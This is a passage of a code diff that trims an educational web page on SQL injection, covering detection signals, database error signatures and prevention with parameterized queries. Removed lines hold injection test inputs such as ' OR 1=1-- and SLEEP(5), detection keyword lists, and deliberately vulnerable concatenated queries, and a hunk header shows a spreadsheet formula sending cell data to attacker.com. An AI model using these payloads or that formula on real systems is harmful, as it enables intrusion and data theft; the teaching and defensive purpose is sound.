-                    </Typography>
-                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
-                      The application reveals database errors:
+                      Error Signals
                     </Typography>
                     <List dense>
-                      <ListItem><ListItemText primary="SQL syntax error messages appear" secondary="Any mention of SQL, syntax, or query errors" /></ListItem>
-                      <ListItem><ListItemText primary="500 Internal Server Error" secondary={`Especially when adding ' or " to input`} /></ListItem>
-                      <ListItem><ListItemText primary="Stack traces mention database" secondary="JDBC, MySQL, psycopg2, etc. in error" /></ListItem>
-                      <ListItem><ListItemText primary="Connection/timeout errors" secondary="Database connection issues after input" /></ListItem>
+                      <ListItem><ListItemText primary="SQL syntax error messages in responses" /></ListItem>
+                      <ListItem><ListItemText primary="Unexpected 500 errors on specific inputs" /></ListItem>
+                      <ListItem><ListItemText primary="Stack traces mentioning database drivers" /></ListItem>
+                      <ListItem><ListItemText primary="Database connection timeout spikes" /></ListItem>
                     </List>
                   </Paper>
                 </Grid>
@@ -2977,119 +2059,56 @@ Cell A1: =WEBSERVICE("http://attacker.com/"&A2)
                     <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                       Behavioral Signals
                     </Typography>
-                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
-                      The application behaves differently:
-                    </Typography>
                     <List dense>
-                      <ListItem><ListItemText primary="Different content for true/false" secondary="Adding AND 1=1 vs AND 1=2 changes response" /></ListItem>
-                      <ListItem><ListItemText primary="Response time changes" secondary="Adding SLEEP(5) makes response 5s slower" /></ListItem>
-                      <ListItem><ListItemText primary="More/fewer results returned" secondary="UNION queries add extra rows" /></ListItem>
-                      <ListItem><ListItemText primary="Unexpected data appears" secondary="Data from other tables shows up" /></ListItem>
+                      <ListItem><ListItemText primary={`Unusual characters in input (' " -- #)`} /></ListItem>
+                      <ListItem><ListItemText primary="Consistent timing delays after certain inputs" /></ListItem>
+                      <ListItem><ListItemText primary="Response size changes based on input" /></ListItem>
+                      <ListItem><ListItemText primary="Unexpected data appearing in responses" /></ListItem>
                     </List>
                   </Paper>
                 </Grid>
                 <Grid item xs={12} md={4}>
-                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#22c55e", 0.03), height: "100%" }}>
-                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
-                      Quick Tests to Try
-                    </Typography>
-                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
-                      Simple inputs to test for SQLi:
-                    </Typography>
-                    <List dense>
-                      <ListItem><ListItemText primary="Single quote: '" secondary="Should cause syntax errors if vulnerable" /></ListItem>
-                      <ListItem><ListItemText primary={`Double quote: "`} secondary="Alternative string delimiter" /></ListItem>
-                      <ListItem><ListItemText primary="Comment: ' OR 1=1--" secondary="Classic bypass test" /></ListItem>
-                      <ListItem><ListItemText primary="Sleep: ' AND SLEEP(5)--" secondary="Check for time delay" /></ListItem>
-                    </List>
-                  </Paper>
-                </Grid>
-              </Grid>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
-                For Defenders: Monitoring for Attacks
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                If you're responsible for security, monitor these signals in your logs and systems:
-              </Typography>
-
-              <Grid container spacing={3} sx={{ mb: 3 }}>
-                <Grid item xs={12} md={6}>
-                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03) }}>
+                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.03), height: "100%" }}>
                     <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
-                      Application & Web Server Logs
+                      Database Signals
                     </Typography>
                     <List dense>
-                      <ListItem><ListItemText primary={`Requests containing ' " ; -- # /*`} secondary="SQL metacharacters in parameters" /></ListItem>
-                      <ListItem><ListItemText primary="Keywords: UNION, SELECT, INSERT, DELETE, DROP" secondary="SQL commands in user input" /></ListItem>
-                      <ListItem><ListItemText primary="Encoded variants: %27 %22 %3B" secondary="URL-encoded SQL characters" /></ListItem>
-                      <ListItem><ListItemText primary="Repeated errors from same IP" secondary="Automated scanning behavior" /></ListItem>
-                      <ListItem><ListItemText primary="Unusual parameter values" secondary="Very long strings, binary data, special chars" /></ListItem>
-                    </List>
-                  </Paper>
-                </Grid>
-                <Grid item xs={12} md={6}>
-                  <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03) }}>
-                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
-                      Database Logs & Monitoring
-                    </Typography>
-                    <List dense>
-                      <ListItem><ListItemText primary="Queries to system tables" secondary="information_schema, sysobjects, pg_tables" /></ListItem>
-                      <ListItem><ListItemText primary="UNION SELECT in query logs" secondary="Unusual query patterns" /></ListItem>
-                      <ListItem><ListItemText primary="Syntax errors spike" secondary="Sudden increase in malformed queries" /></ListItem>
-                      <ListItem><ListItemText primary="Outbound connections from DB" secondary="OOB attack indicator" /></ListItem>
-                      <ListItem><ListItemText primary="Large data reads" secondary="Bulk extraction attempts" /></ListItem>
+                      <ListItem><ListItemText primary="Queries accessing system tables" /></ListItem>
+                      <ListItem><ListItemText primary="UNION SELECT in slow query logs" /></ListItem>
+                      <ListItem><ListItemText primary="Unusual outbound DNS/HTTP from DB" /></ListItem>
+                      <ListItem><ListItemText primary="Bulk data reads from sensitive tables" /></ListItem>
                     </List>
                   </Paper>
                 </Grid>
               </Grid>
 
               <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4 }}>
-                Database Error Signatures by Platform
+                Database Error Signatures
               </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Different databases produce different error messages. Recognizing these helps identify which database
-                you're dealing with (useful for both testers and defenders):
-              </Typography>
-
               <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
                 <Table size="small">
                   <TableHead>
                     <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
                       <TableCell sx={{ fontWeight: 700 }}>Database</TableCell>
-                      <TableCell sx={{ fontWeight: 700 }}>Typical Error Pattern</TableCell>
-                      <TableCell sx={{ fontWeight: 700 }}>What It Tells You</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Error Pattern</TableCell>
                     </TableRow>
                   </TableHead>
                   <TableBody>
                     {[
-                      { db: "MySQL", error: "You have an error in your SQL syntax; near ...", info: "Shows exact position of error" },
-                      { db: "PostgreSQL", error: "ERROR: syntax error at or near ...", info: "Includes line number and position" },
-                      { db: "MSSQL", error: "Unclosed quotation mark after the character string", info: "Often reveals query structure" },
-                      { db: "Oracle", error: "ORA-01756: quoted string not properly terminated", info: "ORA codes identify error type" },
-                      { db: "SQLite", error: "SQLite error: near \"...\": syntax error", info: "Lightweight, file-based DB" },
+                      { db: "MySQL", error: "You have an error in your SQL syntax; near ..." },
+                      { db: "PostgreSQL", error: "ERROR: syntax error at or near ..." },
+                      { db: "MSSQL", error: "Unclosed quotation mark after the character string" },
+                      { db: "Oracle", error: "ORA-01756: quoted string not properly terminated" },
+                      { db: "SQLite", error: "SQLite error: near \"...\": syntax error" },
                     ].map((row) => (
                       <TableRow key={row.db}>
                         <TableCell sx={{ fontWeight: 600 }}>{row.db}</TableCell>
-                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{row.error}</TableCell>
-                        <TableCell sx={{ fontSize: "0.85rem" }}>{row.info}</TableCell>
+                        <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{row.error}</TableCell>
                       </TableRow>
                     ))}
                   </TableBody>
                 </Table>
               </TableContainer>
-
-              <Alert severity="info" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>Detection vs. Prevention</AlertTitle>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  Detection is important for identifying attacks, but it's reactive. The best approach is <strong>prevention
-                  through parameterized queries</strong>. Even if your detection misses something, proper parameterization
-                  means the attack won't work. Think of detection as your security camera - useful, but the lock on the door
-                  (parameterization) is what actually keeps intruders out.
-                </Typography>
-              </Alert>
             </Paper>
 
             {/* ========== SECTION: PREVENTION ========== */}
@@ -3109,108 +2128,45 @@ Cell A1: =WEBSERVICE("http://attacker.com/"&A2)
                 Prevention Strategies
               </Typography>
 
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Here's the good news: SQL injection is one of the most <strong>preventable</strong> vulnerabilities in web security.
-                Unlike some complex attacks that require layered defenses, SQLi has a clear, reliable solution that works
-                every time: <strong>parameterized queries</strong> (also called prepared statements).
+              <Typography variant="body1" sx={{ mb: 3 }}>
+                SQL injection is preventable with proper coding practices. The key principle is to never trust user input
+                and always keep data separate from code.
               </Typography>
-
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                The key principle is simple: <strong>never treat user input as part of the SQL command</strong>. Always keep
-                data and code completely separate. Let's explore the various prevention strategies from most to least effective:
-              </Typography>
-
-              {/* Primary Defense */}
-              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
-                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
-                  Primary Defense: Parameterized Queries
-                </Typography>
-                <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                  This is the <strong>#1 defense</strong> and should be used everywhere. With parameterized queries, you tell the
-                  database "here's the SQL structure" and separately "here's the data to use." The database knows which is which
-                  and will never execute data as code.
-                </Typography>
-                <Grid container spacing={2}>
-                  <Grid item xs={12} md={6}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>Instead of this (VULNERABLE):</Typography>
-                    <CodeBlock
-                      language="javascript"
-                      code={`// BAD: String concatenation
-query = "SELECT * FROM users WHERE id = " + userId;
-query = "SELECT * FROM users WHERE name = '" + name + "'";
-query = \`SELECT * FROM users WHERE email = '\${email}'\`;`}
-                    />
-                  </Grid>
-                  <Grid item xs={12} md={6}>
-                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>Do this (SECURE):</Typography>
-                    <CodeBlock
-                      language="javascript"
-                      code={`// GOOD: Parameterized queries
-query = "SELECT * FROM users WHERE id = ?";
-db.query(query, [userId]);
-
-query = "SELECT * FROM users WHERE name = $1";
-db.query(query, [name]);`}
-                    />
-                  </Grid>
-                </Grid>
-              </Paper>
 
               <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
-                Prevention Checklist by Priority
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                Use this checklist to ensure comprehensive protection. Critical items are non-negotiable:
+                Prevention Checklist
               </Typography>
 
               <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
                 <Table size="small">
                   <TableHead>
                     <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
-                      <TableCell sx={{ fontWeight: 700, width: 100 }}>Priority</TableCell>
+                      <TableCell sx={{ fontWeight: 700 }}>Priority</TableCell>
                       <TableCell sx={{ fontWeight: 700 }}>Action Item</TableCell>
-                      <TableCell sx={{ fontWeight: 700 }}>Why It Matters</TableCell>
                     </TableRow>
                   </TableHead>
                   <TableBody>
-                    {[
-                      { priority: "Critical", item: "Use parameterized queries everywhere", why: "Fundamental fix that prevents all SQLi" },
-                      { priority: "Critical", item: "Never concatenate user input into SQL", why: "Root cause of SQLi vulnerabilities" },
-                      { priority: "High", item: "Validate data types and use allowlists", why: "Catches invalid input early" },
-                      { priority: "High", item: "Limit database account permissions", why: "Reduces damage if SQLi succeeds" },
-                      { priority: "High", item: "Hide SQL errors from users", why: "Prevents information leakage" },
-                      { priority: "Medium", item: "Keep ORM and drivers up to date", why: "Patches known vulnerabilities" },
-                      { priority: "Medium", item: "Log and alert on SQL errors", why: "Enables attack detection" },
-                      { priority: "Medium", item: "Use WAF as additional layer", why: "Catches known attack patterns" },
-                      { priority: "Medium", item: "Network segmentation for DB", why: "Limits blast radius of breach" },
-                      { priority: "Medium", item: "Regular code reviews and SAST", why: "Finds vulnerabilities before production" },
-                    ].map((row, idx) => (
+                    {preventionChecklist.map((item, idx) => (
                       <TableRow key={idx}>
                         <TableCell>
                           <Chip
-                            label={row.priority}
+                            label={item.priority}
                             size="small"
                             sx={{
-                              bgcolor: row.priority === "Critical" ? alpha("#ef4444", 0.15) :
-                                       row.priority === "High" ? alpha("#f59e0b", 0.15) : alpha("#3b82f6", 0.15),
-                              color: row.priority === "Critical" ? "#ef4444" :
-                                     row.priority === "High" ? "#f59e0b" : "#3b82f6",
+                              bgcolor: item.priority === "Critical" ? alpha("#ef4444", 0.15) :
+                                       item.priority === "High" ? alpha("#f59e0b", 0.15) : alpha("#3b82f6", 0.15),
+                              color: item.priority === "Critical" ? "#ef4444" :
+                                     item.priority === "High" ? "#f59e0b" : "#3b82f6",
                               fontWeight: 600,
                             }}
                           />
                         </TableCell>
-                        <TableCell sx={{ fontWeight: 500 }}>{row.item}</TableCell>
-                        <TableCell sx={{ color: "text.secondary", fontSize: "0.85rem" }}>{row.why}</TableCell>
+                        <TableCell>{item.item}</TableCell>
                       </TableRow>
                     ))}
                   </TableBody>
                 </Table>
               </TableContainer>
-
-              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
-                Understanding the Defenses
-              </Typography>
 
               <Grid container spacing={3}>
                 <Grid item xs={12} md={6}>
@@ -3218,14 +2174,11 @@ db.query(query, [name]);`}
                     <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                       Why Parameterization Works
                     </Typography>
-                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                      Parameterized queries work because they fundamentally change how queries are processed:
-                    </Typography>
                     <List dense>
-                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Database parses SQL structure FIRST" secondary="Before any user data is introduced" /></ListItem>
-                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Parameters sent separately" secondary="Data travels in a different channel than code" /></ListItem>
-                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Typed as data, not code" secondary="Database knows parameters are values, not commands" /></ListItem>
-                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Performance bonus" secondary="Query plans can be cached and reused" /></ListItem>
+                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Database parses SQL structure before seeing data" /></ListItem>
+                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Parameters are sent separately from commands" /></ListItem>
+                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Parameters treated as typed data, not executable" /></ListItem>
+                      <ListItem><CheckCircleIcon sx={{ color: "#22c55e", mr: 1 }} fontSize="small" /><ListItemText primary="Query plans can be safely cached" /></ListItem>
                     </List>
                   </Paper>
                 </Grid>
@@ -3234,156 +2187,15 @@ db.query(query, [name]);`}
                     <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
                       Why Escaping Is Not Enough
                     </Typography>
-                    <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                      Some developers try to "escape" special characters instead of parameterizing. This is risky:
-                    </Typography>
                     <List dense>
-                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Rules differ across databases" secondary="What works for MySQL may not work for PostgreSQL" /></ListItem>
-                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Doesn't protect all contexts" secondary="ORDER BY, table names can't be escaped safely" /></ListItem>
-                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Encoding bypasses" secondary="Double encoding, alternate charsets can bypass escaping" /></ListItem>
-                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Easy to forget" secondary="One missed escape = vulnerability" /></ListItem>
+                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Escaping rules differ across databases" /></ListItem>
+                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Doesn't protect non-string contexts (ORDER BY)" /></ListItem>
+                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Encoding edge cases can bypass escaping" /></ListItem>
+                      <ListItem><WarningIcon sx={{ color: "#ef4444", mr: 1 }} fontSize="small" /><ListItemText primary="Hard to ensure consistent escaping everywhere" /></ListItem>
                     </List>
                   </Paper>
                 </Grid>
               </Grid>
-
-              <Accordion sx={{ mt: 3, borderRadius: "8px !important", "&:before": { display: "none" } }}>
-                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
-                  <Typography sx={{ fontWeight: 700 }}>Special Case: Dynamic Column/Table Names</Typography>
-                </AccordionSummary>
-                <AccordionDetails>
-                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
-                    Parameterized queries can't be used for column names, table names, or ORDER BY clauses - only for data values.
-                    For these cases, use a <strong>strict allowlist</strong>:
-                  </Typography>
-                  <CodeBlock
-                    language="javascript"
-                    code={`// User wants to sort by a column - can't parameterize column names
-const userSortColumn = req.query.sort;  // User input
-
-// BAD: Direct concatenation
-const query = "SELECT * FROM products ORDER BY " + userSortColumn; // VULNERABLE!
-
-// GOOD: Allowlist approach
-const allowedColumns = ['name', 'price', 'created_at', 'rating'];
-const sortColumn = allowedColumns.includes(userSortColumn) ? userSortColumn : 'created_at';
-const query = "SELECT * FROM products ORDER BY " + sortColumn;  // Safe - column is from allowlist
-
-// GOOD: Map approach (even safer)
-const columnMap = { 'name': 'product_name', 'price': 'unit_price', 'date': 'created_at' };
-const sortColumn = columnMap[userSortColumn] || 'created_at';
-const query = "SELECT * FROM products ORDER BY " + sortColumn;  // Safe - mapped value`}
-                  />
-                </AccordionDetails>
-              </Accordion>
-
-              <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>The Bottom Line</AlertTitle>
-                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
-                  If you do just one thing: <strong>use parameterized queries for all database interactions</strong>.
-                  This single practice prevents virtually all SQL injection attacks. Everything else (WAFs, input validation,
-                  least privilege) is helpful defense-in-depth, but parameterization is the foundation.
-                </Typography>
-              </Alert>
-            </Paper>
-
-            {/* ========== SECTION: ORM PITFALLS ========== */}
-            <Paper
-              id="orm-pitfalls"
-              sx={{
-                p: 4,
-                mb: 5,
-                borderRadius: 4,
-                bgcolor: alpha(theme.palette.background.paper, 0.6),
-                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
-                scrollMarginTop: 96,
-              }}
-            >
-              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
-                <MemoryIcon sx={{ color: accent }} />
-                ORM and Query Builder Pitfalls
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
-                ORMs and query builders reduce SQL injection risk by encouraging parameterized queries, but they do not
-                eliminate it. Most SQLi bugs appear when developers escape the ORM safety net and assemble raw SQL or
-                dynamic identifiers.
-              </Typography>
-
-              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
-                Treat any API that accepts raw SQL, string templates, or dynamic column names as a high risk area.
-                The safest approach is to keep all queries in a single data access layer and use strict allowlists
-                for any dynamic pieces that cannot be parameterized.
-              </Typography>
-
-              <Grid container spacing={3} sx={{ mb: 3 }}>
-                <Grid item xs={12} md={6}>
-                  <Paper sx={{ p: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
-                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
-                      Common ORM Pitfalls
-                    </Typography>
-                    <List dense>
-                      <ListItem><ListItemText primary="Raw SQL helpers with string interpolation" secondary="queryRaw, whereRaw, literal, or raw()" /></ListItem>
-                      <ListItem><ListItemText primary="Dynamic ORDER BY or column names from user input" secondary="Identifiers cannot be parameterized" /></ListItem>
-                      <ListItem><ListItemText primary="Building WHERE clauses with string concatenation" secondary="Filters built from query strings or JSON" /></ListItem>
-                      <ListItem><ListItemText primary="Stored procedures with dynamic SQL" secondary="EXEC or PREPARE inside procedures" /></ListItem>
-                      <ListItem><ListItemText primary="Using ORM escape utilities as a replacement for parameters" secondary="Escaping is not a complete defense" /></ListItem>
-                    </List>
-                  </Paper>
-                </Grid>
-                <Grid item xs={12} md={6}>
-                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
-                    <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
-                      Safe ORM Patterns
-                    </Typography>
-                    <List dense>
-                      <ListItem><ListItemText primary="Use parameter binding APIs for all values" secondary="where(), findMany(), prepared statements" /></ListItem>
-                      <ListItem><ListItemText primary="Allowlist sort fields and map to internal column names" secondary="Never trust user input as identifiers" /></ListItem>
-                      <ListItem><ListItemText primary="Centralize data access in a repository layer" secondary="Reduce ad-hoc raw SQL usage" /></ListItem>
-                      <ListItem><ListItemText primary="Log SQL in non-production and review query patterns" secondary="Catch risky raw queries early" /></ListItem>
-                      <ListItem><ListItemText primary="Use linting or code review to block string-built SQL" secondary="Automate enforcement" /></ListItem>
-                    </List>
-                  </Paper>
-                </Grid>
-              </Grid>
-
-              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
-                Example: Unsafe Raw Query
-              </Typography>
-              <CodeBlock
-                language="javascript"
-                title="VULNERABLE: Raw SQL with string interpolation"
-                code={`// User-controlled input
-const sort = req.query.sort;
-const email = req.query.email;
-
-// DANGER: Raw query with interpolated values
-const query = "SELECT * FROM users WHERE email = '" + email + "' ORDER BY " + sort;
-db.query(query);`}
-              />
-
-              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
-                Example: Safe Query Builder Pattern
-              </Typography>
-              <CodeBlock
-                language="javascript"
-                title="SECURE: Parameter binding with allowlist"
-                code={`const email = req.query.email;
-const sort = req.query.sort;
-
-const allowedSorts = { name: "name", created: "created_at", status: "status" };
-const sortColumn = allowedSorts[sort] || "created_at";
-
-// Data is parameterized, identifiers are allowlisted
-const query = "SELECT * FROM users WHERE email = ? ORDER BY " + sortColumn + " LIMIT ?";
-db.query(query, [email, 100]);`}
-              />
-
-              <Alert severity="info" sx={{ mt: 2, borderRadius: 2 }}>
-                <AlertTitle sx={{ fontWeight: 700 }}>ORMs Help, But They Are Not Magic</AlertTitle>
-                Use ORM features as intended, avoid raw SQL unless absolutely necessary, and enforce allowlists for any
-                dynamic identifiers. The same core rule applies: keep data and code separate.
-              </Alert>
             </Paper>
 
             {/* ========== SECTION: SECURE CODE EXAMPLES ========== */}
